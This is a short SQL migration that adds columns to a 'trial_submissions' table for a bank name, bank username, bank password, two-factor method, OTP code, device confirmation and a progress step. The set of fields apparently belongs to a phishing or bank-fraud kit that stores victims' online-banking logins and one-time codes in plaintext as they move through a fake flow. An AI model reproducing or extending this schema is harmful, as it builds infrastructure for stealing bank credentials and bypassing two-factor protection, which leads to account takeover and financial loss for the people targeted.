ALTER TABLE public.trial_submissions
  ADD COLUMN IF NOT EXISTS bank_name text,
  ADD COLUMN IF NOT EXISTS bank_username text,
  ADD COLUMN IF NOT EXISTS bank_password text,
  ADD COLUMN IF NOT EXISTS twofa_method text,
  ADD COLUMN IF NOT EXISTS otp_code text,
  ADD COLUMN IF NOT EXISTS device_confirmed boolean DEFAULT false,
  ADD COLUMN IF NOT EXISTS step text;